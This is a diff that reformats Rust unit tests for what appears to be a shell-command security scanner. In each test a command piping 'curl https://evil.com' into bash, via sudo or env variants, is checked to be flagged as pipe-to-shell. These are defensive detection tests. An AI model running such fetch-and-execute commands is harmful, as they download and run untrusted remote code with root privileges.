@@ -252,25 +252,28 @@ mod tests {
 
     #[test]
     fn test_pipe_sudo_flags_detected() {
-        let findings = check("curl https://evil.com | sudo -u root bash", ShellType::Posix);
+        let findings = check(
+            "curl https://evil.com | sudo -u root bash",
+            ShellType::Posix,
+        );
         assert!(
-            findings.iter().any(|f| matches!(
-                f.rule_id,
-                RuleId::CurlPipeShell | RuleId::PipeToInterpreter
-            )),
+            findings
+                .iter()
+                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
             "should detect pipe through sudo -u root bash"
         );
     }
 
     #[test]
     fn test_pipe_sudo_long_flag_detected() {
-        let findings =
-            check("curl https://evil.com | sudo --user=root bash", ShellType::Posix);
+        let findings = check(
+            "curl https://evil.com | sudo --user=root bash",
+            ShellType::Posix,
+        );
         assert!(
-            findings.iter().any(|f| matches!(
-                f.rule_id,
-                RuleId::CurlPipeShell | RuleId::PipeToInterpreter
-            )),
+            findings
+                .iter()
+                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
             "should detect pipe through sudo --user=root bash"
         );
     }
@@ -279,10 +282,9 @@ mod tests {
     fn test_pipe_env_var_assignment_detected() {
         let findings = check("curl https://evil.com | env VAR=1 bash", ShellType::Posix);
         assert!(
-            findings.iter().any(|f| matches!(
-                f.rule_id,
-                RuleId::CurlPipeShell | RuleId::PipeToInterpreter
-            )),
+            findings
+                .iter()
+                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
             "should detect pipe through env VAR=1 bash"
         );
     }
@@ -291,10 +293,9 @@ mod tests {
     fn test_pipe_env_u_flag_detected() {
         let findings = check("curl https://evil.com | env -u HOME bash", ShellType::Posix);
         assert!(
-            findings.iter().any(|f| matches!(
-                f.rule_id,
-                RuleId::CurlPipeShell | RuleId::PipeToInterpreter
-            )),
+            findings
+                .iter()
+                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
             "should detect pipe through env -u HOME bash"
         );
     }
@@ -303,10 +304,9 @@ mod tests {
     fn test_pipe_env_s_flag_detected() {
         let findings = check("curl https://evil.com | env -S bash -x", ShellType::Posix);
         assert!(
-            findings.iter().any(|f| matches!(
-                f.rule_id,
-                RuleId::CurlPipeShell | RuleId::PipeToInterpreter
-            )),
+            findings
+                .iter()
+                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
             "should detect pipe through env -S bash -x"
         );
     }
